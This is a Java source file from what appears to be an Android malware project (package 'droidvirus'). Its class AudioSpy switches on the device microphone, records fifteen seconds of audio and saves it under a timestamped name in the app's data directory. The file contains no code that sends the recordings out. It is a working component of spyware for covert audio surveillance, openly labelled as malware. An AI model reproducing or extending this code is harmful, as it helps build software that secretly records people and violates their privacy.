package com.artisanter.droidvirus;

import android.content.Context;
import android.media.MediaRecorder;

import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class AudioSpy {
    static void recordAudio(String file, final int time) {
        final MediaRecorder recorder = new MediaRecorder();

        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(file);

        try {
            recorder.prepare();
        } catch (IOException ignored) {}

        recorder.start();

        Thread timer = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(time * 1000);
                } catch (InterruptedException ignored) {
                } finally {
                    recorder.stop();
                    recorder.release();
                }
            }
        });
        timer.start();
    }

    static void writeAudio(Context context){
        DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.US);
        Date date = new Date();

        String filePrefix = context.getApplicationInfo().dataDir + "/audio-";

        recordAudio(filePrefix + formatter.format(date) + ".3gp", 15);
    }
}
